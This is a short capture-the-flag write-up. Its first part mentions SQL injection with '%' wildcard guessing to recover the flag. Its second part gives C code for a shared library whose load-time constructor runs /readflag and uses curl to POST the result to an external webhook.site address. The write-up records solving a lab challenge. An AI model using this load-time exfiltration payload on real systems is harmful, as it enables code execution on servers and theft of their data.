Part 1 of the challenge involves sqli and using '%' to guess the characters and get the flag.

Part 2 of the challenge involves executing a file within the remote server - 
```c
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor)) void on_load() {
    FILE *fp;
    char buffer[128];
    char curlCommand[256];
    const char *url = "https://webhook.site/";
    fp = popen("/readflag", "r");
    if (fp == NULL) {
        perror("popen failed");
        return;
    }
    if (fgets(buffer, sizeof(buffer), fp) != NULL) {
        snprintf(curlCommand, sizeof(curlCommand), "curl -X POST -d \"flag=%s\" %s", buffer, url);
        system(curlCommand);
    }
    pclose(fp);
}
```


